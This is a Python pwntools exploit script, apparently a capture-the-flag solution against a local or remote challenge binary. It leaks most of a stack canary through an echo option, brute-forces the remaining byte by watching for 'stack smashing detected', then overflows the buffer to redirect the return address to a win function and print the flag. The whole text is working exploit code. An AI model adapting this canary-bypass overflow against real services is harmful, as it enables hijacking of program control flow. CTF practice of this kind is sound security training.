from pwn import *

REMOTE = False

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 50200

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')

offset = 72                 # Obtained trough GBD as usual
win_address = 0x4011f6      # Obtianed trough GBD with p win

base_payload = b"A" * offset        # Define a base payload that will overflow the buffer

conn.recvuntil(b"3. Exit\n")
conn.sendline(b"1")                 # Select the echo function
conn.recvline()
conn.sendline(base_payload)         # Send the base payload. Remember that using sendLine we will append a \n at the end

conn.recvuntil(b"You said: " + b"A"*offset + b"\n")     # Get all the output before the canary

canary = b"\x00" + conn.recv(6)     # Retrieve 6 bytes of canary and add the starting 0x00 to it

for i in range(0xff):               # Brute force the remaining byte of the canary
    conn.recvuntil(b"3. Exit\n")
    conn.sendline(b"2")                                 # Choose to use toUppercase function

    payload = base_payload + canary + bytes([i])        # Append the current byte guess
    print(f"{i}-th payload: {payload}")

    conn.sendlineafter(b"uppercased: ", payload)

    crashLine = conn.recvuntil(b"Available commands")
    print(crashLine)
    if(not (b"stack smashing detected" in crashLine)):  # If the program didn't crash, the guess is correct
        canary += bytes([i])
        print(f"Canary cracked")
        break

# Use the previously gained info to modify the return address of the main function
payload = base_payload + canary + b"B"*8 + p64(win_address)     # Notice the padding of size 8, due to the 64 bit system
print(payload)

conn.recvuntil(b"3. Exit\n")            # Feed the payload to the main function and retrieve the flag
conn.clean()
conn.sendline(payload)
conn.recvuntil(b"3. Exit\n")
conn.sendline(b"3")

conn.recvuntil(b"Here is the flag: ")
flag = conn.recvline(keepends=False).decode()
conn.close()
print(flag)
